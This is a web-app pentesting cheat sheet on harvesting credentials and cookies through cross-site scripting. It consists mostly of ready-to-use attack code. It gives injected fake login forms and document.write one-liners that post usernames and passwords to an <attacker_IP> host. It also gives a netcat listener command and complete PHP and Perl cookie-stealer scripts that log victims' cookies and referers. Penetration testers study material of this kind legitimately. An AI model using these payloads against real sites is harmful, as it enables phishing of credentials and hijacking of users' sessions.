# Harvest Cookies

Search Tag(s): #helpers #webapp-pentesting #cross-site-scripting

## 01 - Client Side

Phishing Form

```html
<h3>Login To Proceed</h3>
<form action=http://<attacker_IP>>
	Username:<br><input type="username" name="Username"></br>
	Password:<br><input type="password" name="Password"></br>
<br><input type="submit" value="Logon"></br>

<h3>Login to continue</h3>  
<form action=http://<attacker_IP>>  
 <input type="username" name="username" placeholder="Username">  
 <input type="password" name="password" placeholder="Password">  
 <input type="submit" name="submit" value="Login">  
</form>

<div>
	<h3>Login to continue</h3>
	<input type="text" placeholder="Username">
	<input type="text" placeholder="Password">
	<input type="submit" value="Login">
	<br><br>
</div>

document.write('<h3>Login to continue</h3>  
<form action=http://<attacker_IP>>  
 <input type="username" name="username" placeholder="Username">  
 <input type="password" name="password" placeholder="Password">  
 <input type="submit" name="submit" value="Login">  
</form>');document.getElementById('urlform').remove();
```

- One liners

```html
<h3>Login To Proceed</h3> <form action=http://<attacker_IP>>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

<h3>Login to continue</h3> <form action=http://<attacker_IP>> <input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login">  
</form>

<div><h3>Login to continue</h3> <input type="text" placeholder="Username"><input type="text" placeholder="Password"><input type="submit" value="Login"><br><br></div>
```

## 02 - Server Side

### 2.1 - Netcat Listener

```
$ nc -lnvp <server_HTTP_PORT>
```

### 2.2 - PHP Cookie Stealer

```php
<?php
$redirect = $_SERVER['PHP_SELF'];
# $redirect = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
# $redirect = "http[s]://" . $_SERVER['HTTP_HOST'];

header('Location: '. $redirect);
# header('Location: ?');

$cookie = $_GET['cookie'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' . $cookie . "\r\n");
fclose($fp);
?>
```

### 2.3 - Perl Cookie Stealer

```perl
#!/usr/bin/perl
use POSIX;
# sudo mv cookie_stealer.pl /var/www/html/
# sudo chown www-data:www-data /var/www/html/cookie_stealer.pl
# sudo chmod 700 /var/www/html/cookie_stealer.pl
# perl -c /var/www/html/cookie_stealer.pl

# Get Current Date
# my $date = strftime "%a-%b-%e-%H:%M:%S-%Y", localtime;
my $date = strftime "%a-%b-%e-%H:%M:%S-%Y", gmtime;

#Log Directory
$dir	= "/var/www/logdir";

#Log File
$file	= "$dir/log.txt";

#Print HTML if tested from a browser
print "Content-type: text/html\n\n";

#Open Log File in appended mode
open(our $LOG,">>$file");

#Collect HTML Post Data
siphon_cookies();

#Close Log File
close($LOG);

sub siphon_cookies {
        # Put the posted data into variables
        if($ENV{'QUERY_STRING'} ne "") {
                $buffer = $ENV{'QUERY_STRING'};
        }
        elsif($ENV{'CONTENT_LENGTH'} ne "") {
                #Read the input stream using the below line
                read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
        }
        elsif($#ARGV > -1) {
                chomp($buffer = $ARGV[0]);
        }

	#print "buffer: $buffer<BR>\n";


	#Place buffer into the array @pairs, delimited by the ";%20"
	#A ";" plus "%20" equals a ";" and a space	
        @pairs = split(/;%20/, $buffer);

	print "----------------------------------<br>\n";
	print $LOG "----------------------------------\n";

	$HTTP_REFERER = $ENV{'HTTP_REFERER'};
	print "HTTP_REFERER: $HTTP_REFERER<BR>\n";
	print $LOG "HTTP_REFERER: $HTTP_REFERER\n";

	#Enumerate through the @pairs array
        foreach $pair (@pairs) {
		#splits each name/value pair on the equal sign delimiter
                ($name, $value) = split(/=/, $pair);

		#translates every "+" sign back to a space
                $value =~ tr/+/ /;

		#substitute every %HH hex pair back to its equivalent ASCII character, using the pack() function
                $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;

		#store the values into a hash called %FORM
                $FORM{$name} = $value;

                print "DATE: $date; NAME: $name;VALUE: $value<BR>\n";
                print $LOG "DATE: $date; NAME: $name; VALUE: $value\n";
        }

	print "----------------------------------<br>\n";
	print $LOG "----------------------------------\n";

}
```

---
## References

- [XSS Phishing for Fun and Credentials!](https://www.doyler.net/security-not-included/xss-phishing)

- [Computer Security Student (CSS): Perl XSS Cookie Stealer](http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson13/logit.pl.TXT)

- [Step 20: Cross-Site Scripting (XSS)](https://medium.com/@joshthedev/step-20-cross-site-scripting-xss-1df10ff7fd12)

- [nettitude: XSS Payloads](https://github.com/nettitude/xss_payloads)